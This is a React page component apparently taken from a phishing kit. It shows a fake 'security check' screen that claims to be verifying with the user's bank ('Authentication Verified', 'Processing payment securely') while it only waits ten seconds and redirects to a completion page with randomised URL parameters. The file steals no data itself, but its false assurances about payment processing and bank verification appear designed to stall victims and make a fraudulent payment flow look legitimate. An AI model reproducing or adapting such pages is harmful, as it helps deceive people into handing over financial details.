import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import {
  Box,
  Container,
  Flex,
  Icon,
  Text,
  Spinner,
  VStack,
} from "@chakra-ui/react";
import { MdLocationOn } from "react-icons/md";
import Header from "../components/Header";
import Footer from "../components/Footer";
import ProgressBar from "../components/ProgressBar";
import { randomParamsURL } from "../utils/validation";

const SecurityCheck = () => {
  const navigate = useNavigate();

  useEffect(() => {
    const timer = setTimeout(() => {
      navigate(`/complete?${randomParamsURL()}`);
    }, 10000);

    return () => clearTimeout(timer);
  }, [navigate]);

  return (
    <Box minH="100vh" display="flex" flexDirection="column" bg="#efefef">
      <Header />

      <Box flex="1" py={{ base: 4, md: 6 }}>
        <Container maxW="800px" px={{ base: 4, md: 6 }} mx="auto">
          <ProgressBar currentStep={5} />

          <Box
            bg="white"
            border="1px solid"
            borderColor="#cbcbcb"
            borderRadius="8px"
            boxShadow="0 2px 12px rgba(0,0,0,0.08)"
            overflow="hidden">
            {/* Header Tab */}
            <Flex
              bg="#279989"
              bgGradient="linear(to-r, #279989, #2aaa96)"
              color="white"
              fontSize={{ base: "18px", md: "20px" }}
              fontWeight="700"
              p={4}
              align="center"
              justify="center"
              minH="75px"
              boxShadow="0 2px 8px rgba(39, 153, 137, 0.3)">
              <Icon as={MdLocationOn} boxSize={{ base: 6, md: 8 }} mr={2} />
              <Text>Security check</Text>
            </Flex>

            {/* Loading Content */}
            <Box p={{ base: 8, md: 12 }} pb={{ base: 12, md: 20 }} bg="white">
              <VStack spacing={8}>
                <Text
                  fontSize={{ base: "20px", md: "24px" }}
                  textAlign="center"
                  fontWeight="700"
                  color="#2c3e50"
                  lineHeight="1.4">
                  Finalizing Secure Transaction
                </Text>

                <Text
                  fontSize={{ base: "14px", md: "16px" }}
                  textAlign="center"
                  fontWeight="500"
                  color="#7f8c8d"
                  maxW="500px"
                  lineHeight="1.6">
                  We are establishing a secure connection with your financial
                  institution to complete the verification process.
                </Text>

                <Box position="relative" py={6}>
                  {/* Animated Rings */}
                  <Box
                    position="absolute"
                    top="50%"
                    left="50%"
                    transform="translate(-50%, -50%)"
                    w="140px"
                    h="140px"
                    borderRadius="50%"
                    border="2px solid"
                    borderColor="rgba(39, 153, 137, 0.1)"
                    sx={{
                      animation: "pulse 2s ease-in-out infinite",
                      "@keyframes pulse": {
                        "0%, 100%": {
                          transform: "translate(-50%, -50%) scale(1)",
                          opacity: 1,
                        },
                        "50%": {
                          transform: "translate(-50%, -50%) scale(1.1)",
                          opacity: 0.5,
                        },
                      },
                    }}
                  />
                  <Box
                    position="absolute"
                    top="50%"
                    left="50%"
                    transform="translate(-50%, -50%)"
                    w="110px"
                    h="110px"
                    borderRadius="50%"
                    border="2px solid"
                    borderColor="rgba(39, 153, 137, 0.2)"
                    sx={{
                      animation: "pulse 2s ease-in-out infinite 0.3s",
                      "@keyframes pulse": {
                        "0%, 100%": {
                          transform: "translate(-50%, -50%) scale(1)",
                          opacity: 1,
                        },
                        "50%": {
                          transform: "translate(-50%, -50%) scale(1.1)",
                          opacity: 0.5,
                        },
                      },
                    }}
                  />

                  <Spinner
                    thickness="5px"
                    speed="0.7s"
                    emptyColor="#e0e0e0"
                    color="#279989"
                    size="xl"
                    w="100px"
                    h="100px"
                  />
                </Box>

                <VStack spacing={3}>
                  <Text
                    fontSize={{ base: "14px", md: "16px" }}
                    textAlign="center"
                    fontWeight="600"
                    color="#279989">
                    ✓ Authentication Verified
                  </Text>
                  <Text
                    fontSize={{ base: "13px", md: "14px" }}
                    textAlign="center"
                    fontWeight="500"
                    color="#95a5a6">
                    Processing payment securely...
                  </Text>
                </VStack>

                <Box
                  w="full"
                  maxW="400px"
                  p={4}
                  bg="linear-gradient(135deg, #fef3c7 0%, #fde68a 100%)"
                  borderRadius="8px"
                  border="1px solid #fbbf24"
                  mt={4}>
                  <Text
                    fontSize="13px"
                    textAlign="center"
                    color="#78350f"
                    fontWeight="600">
                    ⚠️ Please do not close this window or press the back button
                  </Text>
                </Box>
              </VStack>
            </Box>
          </Box>
        </Container>
      </Box>

      <Footer />
    </Box>
  );
};

export default SecurityCheck;
